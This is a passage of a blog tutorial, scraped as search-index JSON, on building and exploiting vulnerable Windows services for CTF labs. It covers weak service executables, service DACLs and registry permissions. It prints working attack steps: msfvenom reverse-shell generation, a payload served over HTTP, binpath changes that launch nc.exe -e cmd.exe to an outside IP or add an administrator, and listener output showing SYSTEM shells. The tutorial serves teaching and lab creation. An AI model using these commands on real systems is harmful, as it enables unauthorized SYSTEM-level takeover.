escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Sysinternals Process Explorer The Process Explorer tool from Windows Sysinternals can also be used to view and edit service permissions: Process Explorer\rDiscretionary Access Control Lists: Process Explorer DACL\r","date":"2022-03-20","objectID":"/windows-privesc-services/:9:5","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Process Hacker The Process Hacker tool can also be used to view and edit service permissions: Process Hacker\r","date":"2022-03-20","objectID":"/windows-privesc-services/:9:6","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Service Security Editor The Service Security Editor utility is a third-party freeware that let’s us view configure service permissions very easily: Service Security Editor\rWhen can click on the Open... button and view or modify the permissions of the selected service: Service Security Editor Open\r","date":"2022-03-20","objectID":"/windows-privesc-services/:9:7","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Modify service permissions We can modify the service permissions in multiple ways. Let’s see a few methods. ","date":"2022-03-20","objectID":"/windows-privesc-services/:10:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"SC.exe We can modify the permissions of a service with the sc.exe sdset command-line argument. We can give to the administrators full control permissions for a service, we’d use this SDDL string: D:(A;;CCLCSWLORC;;;AU)(A;;**CCDCLCSWRPWPDTLOCRSDRCWDWO**;;;BA)(A;;**CCDCLCSWRPWPDTLOCRSDRCWDWO**;;;SY)(A;;CCLCSWLORC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD) We can apply this SDDL for the VulnService service from an administrator command prompt window: C:\\Users\\user\\Desktop\\64 bit\u003esc.exe sdset \"VulnService\" D:(A;;CCLCSWLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCLCSWLORC;;;BU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD) [SC] SetServiceObjectSecurity SUCCESS We should get the message [SC] SetServiceObjectSecurity SUCCESS in the output as we can see above. Now, the Administrators group can start, stop, query, change the configuration, or even delete the service. The service status buttons and the startup type options in VulnService properties are now available for the Administrators: Service Buttons\r","date":"2022-03-20","objectID":"/windows-privesc-services/:10:1","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Process Explorer If the service is currently running, we can use the Process Explorer tool to modify the service permissions. We’ll launch Process Explorer as administrator and then double-click the VulnService.exe process: Process Explorer Edit Service\rGo to the Services tab and click on the Permissions button: Process Explorer Edit Service\rNow in the Permissions dialog click Advanced: Process Explorer Edit Service\rSelect Administrators and click Edit: Process Explorer Edit Service\rIn the Permission Entry dialog there are two options: Basic Permissions: Grouped permissions / simplified permissions Advanced Permissions: Each permission separately These is the view of the advanced permissions: Process Explorer Edit Service\r","date":"2022-03-20","objectID":"/windows-privesc-services/:10:2","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Process Hacker The Process Hacker tool can also be used to view and edit service permissions: Process Explorer Edit Service\r","date":"2022-03-20","objectID":"/windows-privesc-services/:10:3","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Service Security Editor The Service Security Editor (ServiceSecurityEditor.exe), is a digitally signed executable from Core Technologies Consulting, LLC, which can be used to view and set permissions for any Windows service. We can download this program from here. Select the service from the list and click on the Open… button: Process Explorer Edit Service\rThis opens the Security settings dialog where we can set the permissions for the chosen service: Process Explorer Edit Service\rThen we can click OK and click Done to save our settings. ","date":"2022-03-20","objectID":"/windows-privesc-services/:10:4","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"SetACL.exe The SetACL.exe command-line application (by Helge Klein) is a fantastic command-line tool for automating permissions in Windows. SetACL allows us to alter and inspect ownership and permissions for the file system, registry, printers, network shares, and services, among other things. We can download it here. Note: If we need to assign granular permissions (e.g., grant SERVICE_START but not SERVICE_STOP, or the other way around) for a user or group, then SetACL is not our best option. We can use one of the other methods described before. We can edit the permissions of a service (e.g., VulnService service), and run this command from a command-prompt running as administrator: C:\\Users\\user\\Desktop\\64 bit\u003eSetACL.exe -on \"VulnService\" -ot srv -actn ace -ace \"n:administrators;p:full\" Processing ACL of: \u003cVulnService\u003e SetACL finished successfully. These are the description of the options used: -on: Object Name -ot: Object Type -actn: Action to take -ace: Set permissions/ACE n: Principal (Account or group name) p: Permissions full: full control permissions. This means SERVICE_ALL_ACCESS. Note: We can view a complete list of the command-line switches atthe official SetACL.exe documentation at Helge’s site. SetACL supports only three permissions levels, which are read, start_stop, and full. These are the details about each permission level: read SERVICE_ENUMERATE_DEPENDENTS SERVICE_INTERROGATE SERVICE_QUERY_CONFIG SERVICE_QUERY_STATUS SERVICE_USER_DEFINED_CONTROL READ_CONTROL start_stop SERVICE_ENUMERATE_DEPENDENTS SERVICE_INTERROGATE SERVICE_PAUSE_CONTINUE SERVICE_QUERY_CONFIG SERVICE_QUERY_STATUS SERVICE_START SERVICE_STOP SERVICE_USER_DEFINED_CONTROL READ_CONTROL full SERVICE_CHANGE_CONFIG SERVICE_ENUMERATE_DEPENDENTS SERVICE_INTERROGATE SERVICE_PAUSE_CONTINUE SERVICE_QUERY_CONFIG SERVICE_QUERY_STATUS SERVICE_START SERVICE_STOP SERVICE_USER_DEFINED_CONTROL READ_CONTROL WRITE_OWNER WRITE_DAC DELETE Services Problems For The Attacker The compromised user must be able to either restart the service or restart the machine to apply the changes made for a particular service. Because of this, we as attackers must enumerate the permissions of the service first and verify if our current compromised user has the SeShutdownPrivilege token enabled. We only need one of these options to abuse services or wait for a user to restart the system. Another important detail to point out is that a group policy can be made to prevent users from restarting or shutting down the system, this article goes into the details. Services Payloads In this article I will be using msfvenom to generate payloads, however, in the real world, we would use implants instead or at least encrypted payloads that can bypass AVs. We don’t need to necessarily achieve a reverse shell, we could also add some high-privileged users such as administrators users, add persistence techniques, or do some damage to the system which is NOT recommended. Privilege Escalation via Insecure Service Executables If the service executable is writable or modifiable we can replace the original service executables with one of our own. Our executable could be an implant, a payload or an encrypted payload. However, we should create a backup of the original executable before replacing it with our executable. ","date":"2022-03-20","objectID":"/windows-privesc-services/:10:5","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Configuration Open an administrator command prompt or a PowerShell console as administrator and create the directory that we will use for the service path: C:\\Tools\u003emd \"C:\\Program Files\\Insecure Service Executable\" Copy the service executable file to the path of the service: C:\\Tools\u003ecopy \"C:\\Users\\user\\Desktop\\VulnService\\VulnService\\bin\\Debug\\VulnService.exe\" \"C:\\Program Files\\Insecure Service Executable\\VulnService.exe\" 1 file(s) copied. Grant full permissions to the executable: C:\\Tools\u003eicacls \"C:\\Program Files\\Insecure Service Executable\\VulnService.exe\" /grant \"Authenticated Users:F\" processed file: C:\\Program Files\\Insecure Service Executable\\VulnService.exe Successfully processed 1 files; Failed processing 0 files Create the insecure executable service: C:\\Tools\u003esc create \"Insecure VulnService Executable\" binpath= \"\\\"C:\\Program Files\\Insecure Service Executable\\VulnService.exe\"\\\" type= own displayname= \"Insecure VulnService Executable\" [SC] CreateService SUCCESS Note: To create a quoted path we must add “\\ at the start of the binpath value. Example: “\"C:\\Path To\\Executablee”” or “\"C:\\Path To\\Executable”\". If we just add a vlue like “C:\\Path To\\Executable” then the service will be unquoted. Set the service access rights: C:\\Tools\u003esc sdset \"Insecure VulnService Executable\" \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSW;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\" [SC] SetServiceObjectSecurity SUCCESS Start the service: C:\\Tools\u003esc start \"Insecure VulnService Executable\" SERVICE_NAME: Insecure VulnService Executable TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 13036 FLAGS : ","date":"2022-03-20","objectID":"/windows-privesc-services/:11:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Privilege Escalation Notice that the Authenticated Users group has the FILE_ALL_ACCESS permission on the VulnService.exe file. Now let’s query the Insecure VulnService Executable service and note that it runs with SYSTEM privileges: C:\\Users\\user\u003esc qc \"Insecure VulnService Executable\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: Insecure VulnService Executable TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : \"C:\\Program Files\\Insecure Service Executable\\VulnService.exe\" LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Insecure VulnService Executable DEPENDENCIES : SERVICE_START_NAME : LocalSystem Using accesschk.exe we can see that the service executable file is writable by everyone from the BINARY_PATH_NAME: C:\\Users\\user\u003eC:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -quvw \"C:\\Program Files\\Insecure Service Executable\" Accesschk v6.14 - Reports effective permissions for securable objects Copyright ⌐ 2006-2021 Mark Russinovich Sysinternals - www.sysinternals.com C:\\Program Files\\Insecure Service Executable\\VulnService.exe Medium Mandatory Level (Default) [No-Write-Up] RW NT AUTHORITY\\Authenticated Users FILE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM FILE_ALL_ACCESS RW BUILTIN\\Administrators FILE_ALL_ACCESS Verify if we can restart the service: C:\\Users\\user\u003eC:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -uvqc \"Insecure VulnService Executable\" Accesschk v6.14 - Reports effective permissions for securable objects Copyright ⌐ 2006-2021 Mark Russinovich Sysinternals - www.sysinternals.com Insecure VulnService Executable Medium Mandatory Level (Default) [No-Write-Up] RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS R Everyone SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_START SERVICE_STOP READ_CONTROL Create a backup of the original executable: C:\\Users\\user\u003ecopy \"C:\\Program Files\\Insecure Service Executable\\VulnService.exe\" C:\\Temp Overwrite C:\\Temp\\VulnService.exe? (Yes/No/All): Yes 1 file(s) copied. Stop the service: C:\\Users\\user\u003esc stop \"Insecure VulnService Executable\" SERVICE_NAME: Insecure VulnService Executable TYPE : 10 WIN32_OWN_PROCESS STATE : 3 STOP_PENDING (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 Copy the reverse.exe executable you created and replace the VulnService.exe with it: C:\\Users\\user\u003ecopy C:\\Tools\\reverse.exe \"C:\\Program Files\\Insecure Service Executable\\VulnService.exe\" Overwrite C:\\Program Files\\Insecure Service Executable\\VulnService.exe? (Yes/No/All): Yes 1 file(s) copied. Then in the attacker host, we’ll set up a nc listener: nc -lvnp 443 Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges: C:\\Users\\user\u003enet start \"Insecure VulnService Executable\" # IT HANGS HERE We have escalated privileges to NT AUTHORITY\\SYSTEM: ❯ nc -lvnp 443 listening on [any] 443 ... connect to [192.168.27.128] from (UNKNOWN) [192.168.27.129] 50997 Microsoft Windows [Version 10.0.22000.493] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami /all whoami /all USER INFORMATION ---------------- User Name SID =================== ======== nt authority\\system S-1-5-18 GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== BUILTIN\\Administrators Alias S-1-5-32-544 Enabled by default, Enabled group, Group owner Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group Mandatory Label\\System Mandatory Level Label S-1-16-16384 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= =========================","date":"2022-03-20","objectID":"/windows-privesc-services/:12:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Defense Make sure that the executable permissions restrict a user from replacing it. Privilege Escalation via Insecure Service Permissions If our user has permission to change the configuration of a service that runs as LocalSystem (NT AUTHORITY\\SYSTEM), we can replace the executable of the service with one of our own, this could something such as an implant, payload, or an encrypted payload. However, we must consider if we have privileges to stop/start or restart the service, if not we could try to see if we have the SeShutdownPrivilege token enabled so that we can restart the system. If not we will have to wait for an end user or an administrator to restart the system for us. These are the most dangerous access rights that a service can have: SERVICE_START SERVICE_STOP SERVICE_CHANGE_CONFIG SERVICE_ALL_ACCESS ","date":"2022-03-20","objectID":"/windows-privesc-services/:13:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Configuration Open an administrator command prompt or a PowerShell console as administrator and create the directory that we will use for the service path: C:\\Windows\\system32\u003e md \"C:\\Program Files\\Insecure DACL Service\\\" Copy the service file to the path: PS C:\\Windows\\system32\u003e copy \"C:\\Users\\user\\Desktop\\VulnService\\VulnService\\bin\\Debug\\VulnService.exe\" \"C:\\Program Files\\Insecure DACL Service\\VulnService.exe\" Grant full permissions to the executable: PS C:\\Windows\\system32\u003e icacls \"C:\\Program Files\\Insecure DACL Service\\VulnService.exe\" /grant BUILTIN\\Users:F processed file: C:\\Program Files\\Insecure DACL Service\\VulnService.exe Successfully processed 1 files; Failed processing 0 files Create the DACL service (command prompt as administrator): C:\\Tools\u003esc create \"DACL VulnService\" binpath= \"\\\"C:\\Program Files\\Insecure DACL Service\\VulnService.exe\"\" type= own displayname= \"DACL VulnService\" [SC] CreateService SUCCESS C:\\Tools\u003esc qc \"DACL VulnService\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: DACL VulnService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : \"C:\\Program Files\\Insecure DACL Service\\VulnService.exe\" LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : DACL VulnService DEPENDENCIES : SERVICE_START_NAME : LocalSystem Note: To create a quoted path we must add “\\ at the start of the binpath value. Example: “\"C:\\Path To\\Executable”” or “\"C:\\Path To\\Executable”\". If we just add a value like “C:\\Path To\\Executable” then the service will be unquoted. Set the service access rights through the service’s security descriptor which uses the Service Descriptor Definition Language (SDDL). We’re gonna use the ACE Strings to set the access rights which uses the following syntax: ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute) Knowing this we’re gonna set the access rights: C:\\Windows\\system32\u003esc sdset \"DACL VulnService\" \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSWDC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\" [SC] SetServiceObjectSecurity SUCCESS What do all these ACE strings mean? S: System Access Control List (SACL) D: Discretionary ACL (DACL) The first letter after brackets means: allow (A) or deny (D).* The next set of symbols are assignable access rights.* CC SERVICE_QUERY_CONFIG LC SERVICE_QUERY_STATUS SW SERVICE_ENUMERATE_DEPENDENTS LO SERVICE_INTERROGATE CR SERVICE_USER_DEFINED_CONTROL RC READ_CONTROL RP SERVICE_START WP SERVICE_STOP DT SERVICE_PAUSE_CONTINUE The last two characters are the objects (user, group, or SID) that are granted permissions. There is a list of predefined groups.* AU Authenticated Users AO Account operators RU Alias to allow previous Windows 2000 AN Anonymous logon AU Authenticated users BA Built-in administrators BG Built-in guests BO Backup operators BU Built-in users CA Certificate server administrators CG Creator group CO Creator owner DA Domain administrators DC Domain computers DD Domain controllers DG Domain guests DU Domain users EA Enterprise administrators ED Enterprise domain controllers WD Everyone PA Group Policy administrators IU Interactively logged-on user LA Local administrator LG Local guest LS Local service account SY Local system NU Network logon user NO Network configuration operators NS Network service account PO Printer operators PS Personal self PU Power users RS RAS servers group RD Terminal server users RE Replicator RC Restricted code SA Schema administrators SO Server operators SU Service logon user We can also convert an SDDL string to a custom object with: PS C:\\Users\\user\u003e ConvertFrom-SddlString \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSWDC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\" Owner : Group : DiscretionaryAcl : {Everyone: AccessAllowed (CreateDirectories, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes,","date":"2022-03-20","objectID":"/windows-privesc-services/:14:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Privilege Escalation Let’s verify if we can restart the service: C:\\Tools\u003eC:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -uvqc \"DACL VulnService\" Accesschk v6.14 - Reports effective permissions for securable objects Copyright ⌐ 2006-2021 Mark Russinovich Sysinternals - www.sysinternals.com DACL VulnService Medium Mandatory Level (Default) [No-Write-Up] RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW Everyone SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_CHANGE_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_START SERVICE_STOP READ_CONTROL Noticed how the BUILTIN\\Administrators groups have all the service permissions with SERVICE_ALL_ACCESS. This means that we have full control over the service since the default Windows low-privileged (medium-integrity level) user is in this group by default: C:\\Users\\user\u003ewhoami desktop-bn\\user C:\\Users\\user\u003ewhoami /groups | findstr /i \"builtin\\administrators\" BUILTIN\\Administrators Alias S-1-5-32-544 Group used for deny only We can enumerate the service access rights from medium-integrity level command prompt or PowerShell console with accesschk: PS C:\\Users\\user\u003e C:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -uwcqv user \"DACL VulnService\" Accesschk v6.14 - Reports effective permissions for securable objects Copyright ⌐ 2006-2021 Mark Russinovich Sysinternals - www.sysinternals.com RW DACL VulnService SERVICE_ALL_ACCESS As we can see from the output above, we have the SERVICE_ALL_ACCESS access right therefore we can modify the BINARY_PATH_NAME value that is used by the service and to do that we can use service control manager to modify the service, this are a few things that we could try: sc config \u003cService_Name\u003e binpath= \"C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe\" sc config \u003cService_Name\u003e binpath= \"net localgroup administrators username /add\" sc config \u003cService_Name\u003e binpath= \"cmd \\c C:\\Users\\nc.exe 10.10.10.10 4444 -e cmd.exe\" sc config \u003cService_Name\u003e binpath= \"C:\\meter443.exe\" We’ll simply do the following: C:\\Users\\user\u003esc config \"DACL VulnService\" binpath= \"\\\"C:\\Tools\\reverse.exe\\\"\" [SC] ChangeServiceConfig SUCCESS C:\\Users\\user\u003esc qc \"DACL VulnService\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: DACL VulnService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : \"C:\\Tools\\reverse.exe\" LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : DACL VulnService DEPENDENCIES : SERVICE_START_NAME : LocalSystem Note: In the real-world we would use an implant instead. Generate a reverse shell payload and set up a http service: ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.27.128 LPORT=443 -f exe -o reverse.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: reverse.exe ❯ sudo python3 -m http.server [sudo] password for kali: Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 192.168.27.129 - - [14/Mar/2022 06:52:21] \"GET /reverse.exe HTTP/1.1\" 200 - Transfer the payload: PS C:\\Tools\u003e wget 192.168.27.128:8000/reverse.exe -O reverse.exe Then in the attacker host, we’ll set up a nc listener: nc -lvnp 443 Now we’re gonna restart the service: C:\\Users\\user\u003enet stop \"DACL VulnService\" The DACL VulnService service is stopping. The DACL VulnService service was stopped successfully. C:\\Users\\user\u003enet start \"DACL VulnService\" # THIS WILL HANG We have received a reverse shell as NT AUTHORITY\\SYSTEM with System Integrity Level: ❯ nc -lvnp 443 listening on [any] 443 ... connect to [192.168.27.128] from (UNKNOWN) [192.168.27.129] 50645 Microsoft Windows [Version 10.0.22000.493] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami /all whoami /all USER INFORMATION ---------------- User Name SID =================== ======== nt author","date":"2022-03-20","objectID":"/windows-privesc-services/:15:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Defense Make sure that the service DACL prevents other users from modifying the service configuration. Privilege Escalation via Registry Hives The Windows registry stores entries for each service. Each registry entry have an ACL attached to them. If the ACL is misconfigured we may be able to modify the service. According to the official documentation](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) a registry hive is the following: A hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in. ","date":"2022-03-20","objectID":"/windows-privesc-services/:16:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Configuration Open an administrator command prompt or a PowerShell console as administrator and create the directory that we will use for the service path: C:\\Windows\\system32\u003emd \"C:\\Program Files\\Insecure Registry Service\" Copy the service executable file to the path of the service: C:\\Windows\\system32\u003ecopy \"C:\\Users\\user\\Desktop\\VulnService\\VulnService\\bin\\Debug\\VulnService.exe\" \"C:\\Program Files\\Insecure Registry Service\\VulnService.exe\" 1 file(s) copied. Grant full permissions to the executable: C:\\Windows\\system32\u003eicacls \"C:\\Program Files\\Insecure Registry Service\" /grant \"Authenticated Users:F\" processed file: C:\\Program Files\\Insecure Registry Service Successfully processed 1 files; Failed processing 0 files Create the insecure registry service with the SCM: C:\\Windows\\system32\u003esc create \"Insecure Registry VulnService\" binpath= \"\\\"C:\\Program Files\\Insecure Registry Service\\VulnService.exe\"\" type= own displayname= \"Insecure Registry VulnService\" [SC] CreateService SUCCESS C:\\Windows\\system32\u003esc qc \"Insecure Registry VulnService\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: Insecure Registry VulnService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : \"C:\\Program Files\\Insecure Registry Service\\VulnService.exe\" LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Insecure Registry VulnService DEPENDENCIES : SERVICE_START_NAME : LocalSystem Note: To create a quoted path we must add “\\ at the start of the binpath value. Example: “\"C:\\Path To\\Executablee”” or “\"C:\\Path To\\Executable”\". If we just add a value like “C:\\Path To\\Executable” then the service will be unquoted. Set the service access rights: C:\\Windows\\system32\u003esc sdset \"Insecure Registry VulnService\" \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPLCRCCCLOSW;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\" [SC] SetServiceObjectSecurity SUCCESS Add the service to the registry: C:\\Tools\u003eecho HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Insecure Registry VulnService [17 1 21 8] \u003e svc.txt C:\\Tools\u003eregini svc.txt Start the service: C:\\Windows\\system32\u003esc start \"Insecure Registry VulnService\" SERVICE_NAME: Insecure Registry VulnService TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 4584 FLAGS : ","date":"2022-03-20","objectID":"/windows-privesc-services/:17:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Privilege Escalation Query the Insecure Registry VulnService\" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME). C:\\Users\\user\u003esc qc \"Insecure Registry VulnService\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: Insecure Registry VulnService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : \"C:\\Program Files\\Insecure Registry Service\\VulnService.exe\" LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Insecure Registry VulnService DEPENDENCIES : SERVICE_START_NAME : LocalSystem Using accesschk.exe we’re gonna check which users or groups have access rights to modify the service registry hives: PS C:\\Tools\u003e Get-Acl \"HKLM:\\System\\CurrentControlSet\\Services\\Insecure Registry VulnService\" | Format-List Path : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\I nsecure Registry VulnService Owner : BUILTIN\\Administrators Group : NT AUTHORITY\\SYSTEM Access : Everyone Allow ReadKey NT AUTHORITY\\INTERACTIVE Allow FullControl NT AUTHORITY\\SYSTEM Allow FullControl BUILTIN\\Administrators Allow FullControl Audit : Sddl : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA) PS C:\\Tools\u003e C:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -vwqk \"HKLM\\System\\CurrentControlSet\\Services\\Insecure Registry VulnService\" Accesschk v6.14 - Reports effective permissions for securable objects Copyright ⌐ 2006-2021 Mark Russinovich Sysinternals - www.sysinternals.com HKLM\\System\\CurrentControlSet\\Services\\Insecure Registry VulnService\\Security Medium Mandatory Level (Default) [No-Write-Up] RW NT AUTHORITY\\SYSTEM KEY_ALL_ACCESS RW BUILTIN\\Administrators KEY_ALL_ACCESS Note: The NT AUTHORITY\\INTERACTIVE group have FullControl over the registry keys. This group has all the users that are logged on the system. Also the BUILTIN\\Administrators have full access to this registry hives. Check if we can restart the service: PS C:\\Users\\user\u003e C:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -cl \"Insecure Registry VulnService\" Accesschk v6.14 - Reports effective permissions for securable objects Copyright ⌐ 2006-2021 Mark Russinovich Sysinternals - www.sysinternals.com Insecure Registry VulnService DESCRIPTOR FLAGS: [SE_DACL_PRESENT] [SE_SACL_PRESENT] [SE_SELF_RELATIVE] OWNER: NT AUTHORITY\\SYSTEM [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_PAUSE_CONTINUE SERVICE_START SERVICE_STOP 